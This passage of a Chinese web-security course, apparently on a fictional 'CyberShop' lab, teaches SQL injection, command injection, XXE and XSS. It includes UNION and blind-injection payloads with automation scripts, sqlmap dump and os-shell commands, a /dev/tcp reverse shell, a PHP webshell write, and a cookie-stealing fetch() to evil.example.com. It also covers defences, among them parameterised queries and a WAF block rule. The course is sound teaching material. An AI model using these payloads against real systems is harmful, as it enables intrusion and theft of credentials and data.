class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">-- 获取 users 表的所有列名\n' UNION SELECT group_concat(column_name), 2, 3\n  FROM information_schema.columns\n  WHERE table_name = 'users' --\n-- 页面显示: id,username,password,email,role,created_at</code></pre></div>\n\n<p>最后，提取用户名和密码哈希：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">-- 导出所有用户的用户名和密码哈希\n' UNION SELECT group_concat(username, ':', password SEPARATOR '\\n'), 2, 3\n  FROM users --\n\n-- 页面显示:\n-- admin:$2b$12$LJ3m4ys0Lz...\n-- zhang_wei:$2b$12$Kx8n7Qp9Rt...\n-- li_na:$2b$12$Ym5pZ3Vlcw...\n-- customer01:$2b$12$Z3Vlc3Q...\n-- ...共 15,832 条记录</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">警告</div>\n<p>在真实的渗透测试中，未经授权的数据库访问属于违法行为。本章的所有操作均在授权测试环境中进行。<strong>永远只在你有明确授权的系统上进行安全测试。</strong></p>\n</div>\n\n<!-- ======================== CHECKPOINT 1 ======================== -->\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<!-- ======================== 5. 盲注：当页面无回显时 ======================== -->\n\n<h3>盲注：当页面无回显时</h3>\n\n<p>在上面的例子中，搜索结果页面直接显示了查询返回的数据。但现实中，很多应用并不会把查询结果直接展示给你。这时候就需要用到<strong>盲注（Blind SQL Injection）</strong>技术。</p>\n\n<p>回到 CyberShop 的登录页面。假设它不再显示错误信息，只在登录成功时显示\"欢迎\"，失败时显示\"用户名或密码错误\"。注入仍然存在，但你无法直接看到查询结果。</p>\n\n<h4>布尔盲注（Boolean-based Blind）</h4>\n\n<p>布尔盲注的原理：通过观察页面的<strong>不同反应</strong>（True/False）来逐位推断数据。</p>\n\n<p>假设你在用户名字段注入，密码随意填：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">-- 测试：数据库名的第一个字符是否大于 'm'？\nadmin' AND (SELECT SUBSTRING(database(), 1, 1)) > 'm' --\n\n-- 如果页面显示\"欢迎\"（True），说明第一个字符 > 'm'\n-- 如果页面显示\"错误\"（False），说明第一个字符 <= 'm'\n\n-- 继续缩小范围：\nadmin' AND (SELECT SUBSTRING(database(), 1, 1)) = 'c' --\n-- 页面显示\"欢迎\"！第一个字符是 'c'\n\n-- 第二个字符：\nadmin' AND (SELECT SUBSTRING(database(), 2, 1)) = 'y' --\n-- 页面显示\"欢迎\"！\n\n-- 以此类推，逐字符还原整个数据库名: \"cybershop\"</code></pre></div>\n\n<p>这个过程极其繁琐——一个字符可能需要十几次请求才能确定。但攻击者会编写脚本来自动化这一过程：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import requests\nimport string\n\nurl = \"https://cybershop.example.com/login\"\ncharset = string.ascii_lowercase + string.digits + \"_\"\ndb_name = \"\"\n\nfor position in range(1, 50):  # 猜测最多 50 个字符\n    found = False\n    for char in charset:\n        payload = {\n            \"user\": f\"admin' AND (SELECT SUBSTRING(database(), {position}, 1)) = '{char}' --\",\n            \"pass\": \"anything\"\n        }\n        resp = requests.get(url, params=payload)\n        if \"欢迎\" in resp.text:  # True 分支\n            db_name += char\n            print(f\"[+] 位置 {position}: {char} → 当前结果: {db_name}\")\n            found = True\n            break\n    if not found:\n        break  # 没有匹配，字符串结束\n\nprint(f\"[+] 数据库名: {db_name}\")</code></pre></div>\n\n<h4>时间盲注（Time-based Blind）</h4>\n\n<p>如果页面连 True/False 的区别都没有呢？（比如统一返回\"系统错误\"）这时可以使用<strong>时间盲注</strong>：让数据库在条件为真时<strong>延迟响应</strong>。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">-- MySQL: 使用 SLEEP() 函数\nadmin' AND IF((SELECT SUBSTRING(database(), 1, 1)) = 'c', SLEEP(5), 0) --\n\n-- 如果响应延迟了 5 秒 → 条件为真 → 第一个字符是 'c'\n-- 如果立即返回 → 条件为假 → 第一个字符不是 'c'</code></pre></div>\n\n<p>对应自动化脚本：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import requests\nimport time\nimport string\n\nurl = \"https://cybershop.example.com/login\"\ncharset = string.ascii_lowercase + string.digits + \"_\"\ndb_name = \"\"\nDELAY = 3  # 延迟阈值（秒）\n\nfor position in range(1, 50):\n    for char in charset:\n        payload = {\n            \"user\": f\"admin' AND IF((SELECT SUBSTRING(database(),{position},1))='{char}',SLEEP({DELAY}),0) --\",\n            \"pass\": \"x\"\n        }\n        start = time.time()\n        requests.get(url, params=payload)\n        elapsed = time.time() - start\n\n        if elapsed >= DELAY:\n            db_name += char\n            print(f\"[+] 位置 {position}: {char} → {db_name}\")\n            break\n    else:\n        break\n\nprint(f\"[+] 数据库名: {db_name}\")</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">提示</div>\n<p>盲注的速度非常慢。这就是为什么 <strong>sqlmap</strong> 等自动化工具在实际渗透测试中如此重要——它们内置了高效的二分查找和多线程支持来加速盲注过程。</p>\n</div>\n\n<!-- ======================== 6. 工具化攻击：sqlmap 实战 ======================== -->\n\n<h3>工具化攻击：sqlmap 实战</h3>\n\n<p>手动注入有助于理解原理，但在实际渗透测试中，安全工程师通常使用 <strong>sqlmap</strong> 这样的自动化工具来提高效率。</p>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">关于 sqlmap</div>\n<p>sqlmap 是一个开源的 SQL 注入自动化工具，支持多种数据库（MySQL、PostgreSQL、Oracle、MSSQL 等），能自动检测注入点并利用各种注入技术提取数据。</p>\n</div>\n\n<h4>安装</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Kali Linux 自带，也可手动安装：\ngit clone https://github.com/sqlmapproject/sqlmap.git\ncd sqlmap\npython sqlmap.py --help</code></pre></div>\n\n<h4>基本用法</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 测试 URL 参数是否存在注入\npython sqlmap.py -u \"https://cybershop.example.com/search?q=手机\" --batch\n\n# 指定测试某个参数\npython sqlmap.py -u \"https://cybershop.example.com/search?q=手机\" -p q --batch\n\n# 列出所有数据库\npython sqlmap.py -u \"https://cybershop.example.com/search?q=手机\" --dbs --batch\n\n# 获取指定数据库的所有表\npython sqlmap.py -u \"https://cybershop.example.com/search?q=手机\" -D cybershop --tables --batch\n\n# 导出指定表的数据\npython sqlmap.py -u \"https://cybershop.example.com/search?q=手机\" -D cybershop -T users --dump --batch\n\n# 测试 POST 表单（从登录页面）\npython sqlmap.py -u \"https://cybershop.example.com/login\" --data=\"user=admin&pass=123\" --batch</code></pre></div>\n\n<h4>高级选项</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 指定注入技术类型（B=布尔盲注, T=时间盲注, U=UNION注入, E=报错注入）\npython sqlmap.py -u \"URL\" --technique=BTUE --batch\n\n# 使用代理（隐蔽攻击）\npython sqlmap.py -u \"URL\" --proxy=http://127.0.0.1:8080 --batch\n\n# 设置风险等级和测试深度\npython sqlmap.py -u \"URL\" --level=3 --risk=2 --batch\n\n# 获取数据库 Shell（如果权限允许）\npython sqlmap.py -u \"URL\" --os-shell --batch</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">重要提醒</div>\n<p><strong>工具不等于能力。</strong>sqlmap 很强大，但如果你不理解底层原理，当工具失效时你将无从应对。很多 WAF（Web 应用防火墙）会拦截 sqlmap 的默认特征。只有深刻理解注入原理，才能手动构造绕过 WAF 的 payload。</p>\n</div>\n\n<!-- ======================== CHECKPOINT 2 ======================== -->\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<!-- ======================== 7. 命令注入与 XXE（扩展阅读） ======================== -->\n\n<h3>命令注入与 XXE（扩展阅读）</h3>\n\n<p>SQL 注入属于<strong>注入类漏洞</strong>的大家族。除了 SQL 注入之外，还有两种常见且危害严重的注入漏洞值得了解。</p>\n\n<h4>命令注入（Command Injection）</h4>\n\n<p>当应用程序将用户输入拼接到<strong>操作系统命令</strong>中时，就会产生命令注入。攻击者可以在输入中注入额外的系统命令。</p>\n\n<p>场景：CyberShop 有一个\"图片压缩\"功能，后端调用系统命令处理上传的图片：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># ❌ 危险的 Python 后端代码\nimport os\n\ndef compress_image(filename):\n    # 直接拼接文件名到系统命令中\n    cmd = f\"convert /uploads/{filename} -quality 80 /uploads/compressed_{filename}\"\n    os.system(cmd)</code></pre></div>\n\n<p>如果攻击者将文件名设置为：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">test.jpg; cat /etc/passwd</code></pre></div>\n\n<p>实际执行的命令变成：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">convert /uploads/test.jpg; cat /etc/passwd -quality 80 /uploads/compressed_test.jpg; -quality 80 ...\n\n# 分号 ; 结束了第一条命令，然后执行了 cat /etc/passwd\n# 服务器上的用户信息被泄露！</code></pre></div>\n\n<p>更危险的 payload 可以实现反弹 Shell、写入 WebShell 等操作：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 读取任意文件\ntest.jpg; cat /etc/shadow\n\n# 反弹 Shell\ntest.jpg; bash -i >& /dev/tcp/攻击者IP/4444 0>&1\n\n# 写入 WebShell\ntest.jpg; echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' > /var/www/html/shell.php</code></pre></div>\n\n<h4>XXE 注入（XML External Entity Injection）</h4>\n\n<p>XXE 发生在应用程序解析 XML 输入时，允许攻击者引入外部实体引用，从而读取服务器上的文件、发起 SSRF 攻击等。</p>\n\n<p>场景：CyberShop 有一个 API 接受 XML 格式的商品数据导入：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 正常的 XML 请求\nPOST /api/import HTTP/1.1\nContent-Type: application/xml\n\n&lt;?xml version=\"1.0\"?&gt;\n&lt;product&gt;\n    &lt;name&gt;新手机&lt;/name&gt;\n    &lt;price&gt;2999&lt;/price&gt;\n&lt;/product&gt;</code></pre></div>\n\n<p>攻击者构造恶意 XML，声明一个外部实体指向服务器文件：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;product&gt;\n    &lt;name&gt;&amp;xxe;&lt;/name&gt;\n    &lt;price&gt;2999&lt;/price&gt;\n&lt;/product&gt;</code></pre></div>\n\n<p>如果服务器在解析 XML 时没有禁用外部实体，<code>&amp;xxe;</code> 会被替换为 <code>/etc/passwd</code> 文件的内容，并通过 <code>&lt;name&gt;</code> 标签回显在响应中。</p>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">小结：注入类漏洞的共同本质</div>\n<p>无论是 SQL 注入、命令注入还是 XXE，根本原因都是相同的：<strong>不可信的用户输入被当作代码或指令来执行</strong>。防御的核心思想也一致——将输入严格限制为<strong>数据</strong>，永远不让它变成<strong>代码</strong>。</p>\n</div>\n\n<!-- ======================== 8. 防御：从根本上消除注入漏洞 ======================== -->\n\n<h3>防御：从根本上消除注入漏洞</h3>\n\n<p>了解了攻击手段之后，我们来系统性地学习如何防御 SQL 注入。防御需要<strong>多层纵深</strong>策略。</p>\n\n<h4>第一道防线：参数化查询 / 预编译语句</h4>\n\n<p>这是防御 SQL 注入的<strong>最根本、最有效</strong>的方法。参数化查询将 SQL 语句的结构与数据完全分离——数据库引擎先编译 SQL 模板，然后再填入参数值。用户输入永远不会被解释为 SQL 代码。</p>\n\n<h4>Python（使用 mysql-connector）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import mysql.connector\n\nconn = mysql.connector.connect(host=\"localhost\", user=\"app\", password=\"secret\", database=\"cybershop\")\ncursor = conn.cursor()\n\n# ✅ 使用 %s 占位符 + 元组传参\nquery = \"SELECT * FROM users WHERE username = %s AND password = %s\"\ncursor.execute(query, (username, password))\nresult = cursor.fetchone()</code></pre></div>\n\n<h4>Python（使用 SQLAlchemy ORM）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from sqlalchemy import create_engine, text\n\nengine = create_engine(\"mysql+mysqlconnector://app:secret@localhost/cybershop\")\n\nwith engine.connect() as conn:\n    # ✅ 使用命名参数\n    result = conn.execute(\n        text(\"SELECT * FROM users WHERE username = :user AND password = :pass\"),\n        {\"user\": username, \"pass\": password}\n    )</code></pre></div>\n\n<h4>Node.js（使用 mysql2）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">// ✅ Node.js 参数化查询（使用 mysql2 库）\nconst mysql = require('mysql2/promise');\n\nconst connection = await mysql.createConnection({\n    host: 'localhost',\n    user: 'app',\n    password: 'secret',\n    database: 'cybershop'\n});\n\n// 使用 ? 占位符\nconst [rows] = await connection.execute(\n    'SELECT * FROM users WHERE username = ? AND password = ?',\n    [username, password]\n);</code></pre></div>\n\n<h4>PHP（使用 PDO）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">// ✅ PHP PDO 预处理语句\n$pdo = new PDO('mysql:host=localhost;dbname=cybershop', 'app', 'secret');\n\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user AND password = :pass');\n$stmt->execute([\n    'user' => $username,\n    'pass' => $password\n]);\n$result = $stmt->fetch();</code></pre></div>\n\n<h4>Java（使用 PreparedStatement）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">// ✅ Java PreparedStatement\nConnection conn = DriverManager.getConnection(url, \"app\", \"secret\");\nString sql = \"SELECT * FROM users WHERE username = ? AND password = ?\";\nPreparedStatement stmt = conn.prepareStatement(sql);\nstmt.setString(1, username);  // 第一个 ? 替换为 username\nstmt.setString(2, password);  // 第二个 ? 替换为 password\nResultSet rs = stmt.executeQuery();</code></pre></div>\n\n<h4>第二道防线：输入验证与过滤</h4>\n\n<p>虽然参数化查询足以防御绝大多数 SQL 注入，但输入验证仍然是一个重要的纵深防御层：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import re\n\ndef validate_username(username):\n    \"\"\"只允许字母、数字和下划线，长度 3-32\"\"\"\n    if not re.match(r'^[a-zA-Z0-9_]{3,32}$', username):\n        raise ValueError(\"非法用户名格式\")\n    return username\n\ndef validate_product_id(pid):\n    \"\"\"商品 ID 必须是纯数字\"\"\"\n    if not pid.isdigit():\n        raise ValueError(\"非法商品 ID\")\n    return int(pid)\n\ndef validate_sort_order(order):\n    \"\"\"排序方式只允许白名单值\"\"\"\n    allowed = {'asc', 'desc', 'ASC', 'DESC'}\n    if order not in allowed:\n        raise ValueError(\"非法排序方式\")\n    return order</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">警告：不要依赖输入过滤作为唯一防线</div>\n<p>黑名单过滤（如\"禁止包含 SELECT、UNION 等关键词\"）很容易被绕过。例如用大小写混合 <code>SeLeCt</code>、编码 <code>%53ELECT</code>、嵌套 <code>SELSELECTECT</code> 等方式都能绕过简单的关键词过滤。<strong>参数化查询才是根本解决方案。</strong></p>\n</div>\n\n<h4>第三道防线：最小权限原则</h4>\n\n<p>应用程序连接数据库的账号应该遵循<strong>最小权限原则</strong>——只授予完成业务所需的最小权限：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-sql\">-- ❌ 错误：给 Web 应用使用 root 账号\n-- 连接字符串: mysql://root:password@localhost/cybershop\n\n-- ✅ 正确：创建专用的受限账号\nCREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password_here';\n\n-- 只授予必要的权限\nGRANT SELECT, INSERT, UPDATE ON cybershop.products TO 'webapp'@'localhost';\nGRANT SELECT ON cybershop.users TO 'webapp'@'localhost';\n-- 不给 DELETE 权限（如果业务不需要）\n-- 不给 DROP、CREATE 权限\n-- 不给 FILE 权限（防止读写服务器文件）\n-- 不给 SUPER 权限（防止关闭数据库或修改全局变量）\n\nFLUSH PRIVILEGES;</code></pre></div>\n\n<p>即使攻击者找到了注入点，受限的权限也能大幅降低攻击的危害。</p>\n\n<h4>第四道防线：WAF（Web 应用防火墙）</h4>\n\n<p>WAF 作为最外层的防御，可以拦截常见的 SQL 注入模式：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># WAF 规则示例（伪代码）\nRule: BLOCK request IF\n    parameter CONTAINS \"UNION SELECT\" OR\n    parameter CONTAINS \"' OR \" OR\n    parameter CONTAINS \"1=1\" OR\n    parameter CONTAINS \"--\" OR\n    parameter MATCHES /SLEEP\\s*\\(/ OR\n    parameter MATCHES /BENCHMARK\\s*\\(/</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">WAF 的定位</div>\n<p>WAF 是<strong>纵深防御</strong>的一层，但不是替代参数化查询的借口。WAF 可以被绕过（通过编码、分块传输、HTTP 参数污染等技术），而且维护 WAF 规则需要持续投入。正确的做法是：<strong>先修复代码层面的漏洞，再用 WAF 作为额外的保护层</strong>。</p>\n</div>\n\n<h4>防御总结：纵深防御体系</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">┌─────────────────────────────────────────────────────┐\n│  第 4 层：WAF（拦截已知攻击模式）                     │\n│  ┌─────────────────────────────────────────────────┐│\n│  │  第 3 层：最小权限（限制数据库账号能力）           ││\n│  │  ┌─────────────────────────────────────────────┐││\n│  │  │  第 2 层：输入验证（白名单过滤非法输入）      │││\n│  │  │  ┌─────────────────────────────────────────┐│││\n│  │  │  │  第 1 层：参数化查询（根本防御）          ││││\n│  │  │  │  ┌─────────────────────────────────────┐ ││││\n│  │  │  │  │  应用程序业务逻辑                    │ ││││\n│  │  │  │  └─────────────────────────────────────┘ ││││\n│  │  │  └─────────────────────────────────────────┘│││\n│  │  └─────────────────────────────────────────────┘││\n│  └─────────────────────────────────────────────────┘│\n└─────────────────────────────────────────────────────┘</code></pre></div>\n\n<!-- ======================== CHECKPOINT 3 ======================== -->\n\n<div class=\"checkpoint\" data-cp=\"3\"></div>\n\n<!-- ======================== 9. 动手试试 ======================== -->\n\n<h3>动手试试</h3>\n\n<p>纸上得来终觉浅，绝知此事要躬行。通过以下练习巩固你在本章学到的知识：</p>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">练习清单</div>\n<ul>\n<li><strong>练习 1：登录绕过</strong> — 在模拟的 CyberShop 登录页面尝试不同的 SQL 注入 payload，绕过身份验证</li>\n<li><strong>练习 2：UNION 注入</strong> — 在商品搜索页面完成一次完整的 UNION 注入流程：确定列数 → 找到回显位 → 提取数据库信息 → 导出用户表</li>\n<li><strong>练习 3：盲注挑战</strong> — 在一个没有错误回显的页面上，使用布尔盲注技术逐字符猜解管理员密码</li>\n<li><strong>练习 4：防御加固</strong> — 审查一段有漏洞的代码，将所有 SQL 查询改为参数化写法，并配置最小权限数据库账号</li>\n</ul>\n</div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">配套练习</div>\n<p>在配套的编程练习中，你将亲手对一个存在 SQL 注入漏洞的 Web 应用进行渗透测试，并完成从漏洞发现到修复加固的全流程。练习环境包含一个真实的数据库和 Web 服务器，你可以安全地尝试各种注入技术。</p>\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(3)\"><span class=\"arrow\">▶</span> 编程练习: SQL 注入防护</button>\n</div>";
+
+SECTION_CONTENT["web-03-01"] = "<div class=\"section-transition\"><p>上一章我们学了 <strong>SQL 注入</strong>——通过构造恶意输入让数据库执行非预期的操作。但有些攻击不是针对数据库，而是针对其他用户的浏览器。本章我们来探索 Web 安全的另一个重要领域：XSS（跨站脚本攻击）。</p></div>\n\n<h2>XSS 跨站脚本攻击</h2>\n\n<div class=\"callout default\"><div class=\"callout-title\">渗透测试实战：攻击 CyberShop 商城</div><p>本章你将扮演一名 <strong>渗透测试工程师</strong>，受雇对虚构电商平台 <strong>CyberShop</strong> 进行安全测试。你的任务是逐步发现并利用 XSS 漏洞，最终提交完整的安全报告。每一步攻击都对应一个真实的 XSS 技术，你将在实战中理解它们的原理与危害。</p></div>\n\n<h3>场景引入：CyberShop 的商品评论系统</h3>\n\n<p>你打开了 CyberShop 的首页，浏览了几个商品，注意到每个商品页面底部都有一个 <strong>用户评论区</strong>。用户可以在这里输入文字评价，其他用户也能看到这些评论。</p>\n\n<p>作为渗透测试员，你的第一直觉是：<em>任何接受用户输入并展示在页面上的地方，都可能是 XSS 攻击的入口。</em></p>\n\n<p>让我们先理解 XSS 的核心原理。当 Web 应用将用户的输入<strong>未经处理</strong>地嵌入到 HTML 页面中时，攻击者就可以注入恶意的 JavaScript 代码。浏览器无法区分\"正常的 HTML 内容\"和\"攻击者注入的脚本\"，于是忠实地执行了恶意代码。</p>\n\n<p>XSS 攻击的基本模型如下：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">// 正常用户输入评论: \"这个商品不错\"\n// 服务器返回的 HTML:\n&lt;div class=\"review\"&gt;\n  &lt;p&gt;用户评论: 这个商品不错&lt;/p&gt;\n&lt;/div&gt;\n\n// 攻击者输入评论: &lt;script&gt;alert('XSS')&lt;/script&gt;\n// 如果服务器没有处理，返回的 HTML 变成:\n&lt;div class=\"review\"&gt;\n  &lt;p&gt;用户评论: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/p&gt;\n&lt;/div&gt;\n// 浏览器执行了 script 标签中的代码！</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>XSS 的全称是 Cross-Site Scripting（跨站脚本），缩写本应是 CSS，但因为与层叠样式表（Cascading Style Sheets）冲突，所以安全社区约定俗成地使用 <strong>XSS</strong> 作为缩写。</p></div>\n\n<p>在开始实际攻击之前，我们需要了解 XSS 的三大类型。这三种类型不是学术分类，而是代表了三种截然不同的攻击路径：</p>\n\n<ul>\n  <li><strong>反射型 XSS（Reflected XSS）</strong>——恶意脚本通过 URL 参数\"反射\"到页面上，需要诱导用户点击特制链接</li>\n  <li><strong>存储型 XSS（Stored/Persistent XSS）</strong>——恶意脚本被存储在服务器端（如数据库），每个访问该页面的用户都会中招</li>\n  <li><strong>DOM 型 XSS（DOM-based XSS）</strong>——恶意脚本不经过服务器，直接在浏览器端通过 JavaScript 操作 DOM 触发</li>\n</ul>\n\n<p>接下来，我们将按攻击升级的顺序，逐一实战这三种类型。</p>\n\n<h3>第一次尝试：反射型 XSS</h3>\n\n<p>你注意到 CyberShop 有一个搜索功能。在搜索框输入关键词后，URL 会变成：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/search?q=机械键盘</code></pre></div>\n\n<p>搜索结果页面会显示一行提示文字：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;h2&gt;搜索 \"机械键盘\" 的结果：找到 42 个商品&lt;/h2&gt;</code></pre></div>\n\n<p>你敏锐地发现：<strong>搜索关键词被直接嵌入到了 HTML 中</strong>。如果服务器没有对输入进行过滤，我们可以尝试注入 HTML 标签。</p>\n\n<p>第一步试探——输入一个简单的 HTML 标签看看效果：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/search?q=&lt;b&gt;测试加粗&lt;/b&gt;</code></pre></div>\n\n<p>查看页面源代码，你发现返回的 HTML 是：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;h2&gt;搜索 \"&lt;b&gt;测试加粗&lt;/b&gt;\" 的结果：找到 0 个商品&lt;/h2&gt;</code></pre></div>\n\n<p>页面渲染后，\"测试加粗\"四个字确实变成了加粗！这说明服务器<strong>没有对 HTML 标签进行转义</strong>。现在让我们升级攻击——注入一个 <code>&lt;script&gt;</code> 标签：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">https://cybershop.example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre></div>\n\n<p>当你访问这个 URL 时，浏览器弹出了一个对话框，显示数字 <code>1</code>。攻击成功！</p>\n\n<p>让我们深入分析这次攻击的完整过程。以下是浏览器内部的 HTTP 请求/响应流程：</p>\n\n<h4>攻击流程详解</h4>\n\n<p><strong>第一步：浏览器发送请求</strong></p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\nHost: cybershop.example.com\nUser-Agent: Mozilla/5.0 ...\nCookie: session_id=abc123def456</code></pre></div>\n\n<p>注意 URL 中的 <code>&lt;</code> 和 <code>&gt;</code> 被编码为 <code>%3C</code> 和 <code>%3E</code>，这是 URL 编码（Percent-encoding），浏览器会自动处理。</p>\n\n<p><strong>第二步：服务器返回响应</strong></p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;CyberShop - 搜索结果&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n  &lt;nav&gt;...&lt;/nav&gt;\n  &lt;h2&gt;搜索 \"&lt;script&gt;alert(1)&lt;/script&gt;\" 的结果：找到 0 个商品&lt;/h2&gt;\n  &lt;div class=\"results\"&gt;\n    &lt;p&gt;没有找到相关商品&lt;/p&gt;\n  &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre></div>\n\n<p><strong>第三步：浏览器解析 HTML 并执行脚本</strong></p>\n\n<p>浏览器的 HTML 解析器从上到下读取响应内容。当它遇到 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，不会把它当作普通文本，而是识别为一个脚本标签，然后执行其中的 JavaScript 代码 <code>alert(1)</code>。</p>\n\n<div class=\"callout warn\"><div class=\"callout-title\">关键理解</div><p>浏览器解析 HTML 的核心规则是：<strong>尖括号定义标签边界</strong>。只要攻击者能控制页面中出现未转义的 <code>&lt;</code> 和 <code>&gt;</code>，就有可能注入任意 HTML 标签，包括 <code>&lt;script&gt;</code>。反射型 XSS 之所以叫\"反射\"，是因为恶意脚本从服务器\"弹回\"（反射）到页面上——你发什么，服务器就原样返回什么。</p></div>\n\n<h4>为什么 alert(1) 是安全研究的经典测试？</h4>\n\n<p>你可能觉得弹出一个 <code>alert(1)</code> 没什么实际危害。确实，<code>alert(1)</code> 本身无害，但它是安全研究人员约定俗成的 <strong>概念验证（Proof of Concept, PoC）</strong>。它证明了一件关键的事情：<em>我可以在别人的浏览器中执行任意 JavaScript 代码</em>。</p>\n\n<p>一旦证明了这一点，攻击者可以将 <code>alert(1)</code> 替换为任何恶意代码。就像撬锁练习中打开一把锁证明了\"这扇门可以被入侵\"，至于进门后做什么，那就是另一回事了。</p>\n\n<p>现在，让我们把概念验证升级为真正的攻击。</p>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>攻击升级：窃取 Cookie</h3>\n\n<p><code>alert(1)</code> 证明了代码执行能力，但攻击者追求的是实际利益。在 Web 攻击中，最有价值的目标之一是用户的 <strong>会话 Cookie</strong>——它包含了用户的登录凭证。拿到 Cookie，攻击者就能冒充用户身份，无需密码即可登录其账户。</p>\n\n<h4>Cookie 与身份认证</h4>\n\n<p>在现代 Web 应用中，用户登录后服务器会下发一个包含随机字符串的 Cookie（如 <code>session_id=abc123def456</code>）。后续每次请求，浏览器都会自动携带这个 Cookie，服务器据此识别用户身份。</p>\n\n<p>JavaScript 可以通过 <code>document.cookie</code> 读取当前页面的 Cookie（除非 Cookie 设置了 <code>HttpOnly</code> 标志——我们稍后会讨论这个防御措施）。</p>\n\n<h4>构造窃取 Cookie 的 Payload</h4>\n\n<p>攻击者首先在自己的服务器上准备一个\"接收器\"：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 攻击者的服务器 (evil.example.com) 上的接收脚本\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/steal')\ndef steal():\n    cookie = request.args.get('c', '')\n    # 将窃取的 cookie 保存到文件\n    with open('stolen_cookies.txt', 'a') as f:\n        f.write(f'{cookie}\\n')\n    return 'ok'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)</code></pre></div>\n\n<p>然后构造恶意 JavaScript，将 Cookie 发送到攻击者的服务器：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 恶意 JavaScript payload\nfetch('https://evil.example.com/steal?c=' + encodeURIComponent(document.cookie));</code></pre></div>\n\n<p>现在把这个 payload 嵌入到搜索 URL 中。由于 URL 长度有限制，我们使用更紧凑的形式：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;script&gt;fetch('https://evil.example.com/steal?c='+encodeURIComponent(document.cookie))&lt;/script&gt;</code></pre></div>\n\n<p>完整的攻击 URL：</p>\n\n<div class=\"code-block\"><div 